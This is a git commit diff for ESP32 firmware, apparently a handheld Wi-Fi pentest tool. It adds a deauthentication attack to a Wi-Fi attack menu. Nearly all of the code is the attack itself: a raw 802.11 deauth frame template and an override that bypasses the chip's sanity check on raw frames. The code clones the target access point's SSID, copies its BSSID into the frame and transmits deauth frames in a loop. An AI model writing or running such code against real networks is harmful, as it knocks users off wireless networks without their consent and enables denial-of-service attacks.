60e4cb3b161139c6e2c5a18de6660ed98b969acd
dlazder <dlazder51@gmail.com>
2025-01-30 10:21:04 +0300

    Add deauth function. Need to be checked on APs

--- functions/wifiAttackMenuLoop.h
+++ functions/wifiAttackMenuLoop.h
@@ -1,11 +1,65 @@
+#include "esp_wifi.h"
+#include "esp_system.h"
+
+wifi_ap_record_t ap_record;
+
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
+      if (arg == 31337)
+        return 1;
+      else
+        return 0;
+}
+
+String apSsid;
+String mac;
+int channel;
+uint8_t* bssid;
+int rssi;
+
+static const uint8_t deauth_frame_default[] = {
+	0xc0, 0x00, 0x3a, 0x01,
+	0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0xf0, 0xff, 0x02, 0x00
+};
+uint8_t deauth_frame[sizeof(deauth_frame_default)];
+
+void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
+	ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
+	Serial.println(" -> Sent deauth frame");
+}
+
+void wsl_bypasser_send_deauth_frame(const uint8_t* bssid, int chan) {
+	Serial.print("\Preparing deauth frame to -> ");
+	esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
+	delay(50);
+	memcpy(&deauth_frame[10], bssid, 6);
+	memcpy(&deauth_frame[16], bssid, 6);
+}
+
+
 void wifiAttackMenuLoop() {
 	if (isSetup()) {
 		cursorOnTop();
 		clearScreenWithSymbols();
 		DISP.setCursor(0, 60, 1);
-		printlnCenter(WiFi.SSID(cursor - 2), SMALL_TEXT);
+		apSsid = WiFi.SSID(cursor - 2);
+		mac = WiFi.BSSIDstr(cursor - 2);
+		channel = WiFi.channel(cursor - 2);
+		bssid = WiFi.BSSID(cursor - 2);
+		rssi = WiFi.RSSI(cursor - 2);
+		printlnCenter(apSsid, SMALL_TEXT);
 		printlnCenter(String(WiFi.RSSI(cursor - 2)), SMALL_TEXT);
+
+		WiFi.mode(WIFI_AP);
+		WiFi.softAP(apSsid, "", channel, 1, 4, false);
+		IPAddress ip = WiFi.softAPIP();
+		memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+		wsl_bypasser_send_deauth_frame(bssid, channel);
 	}
 
+	wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+	
 	checkExit();
 }
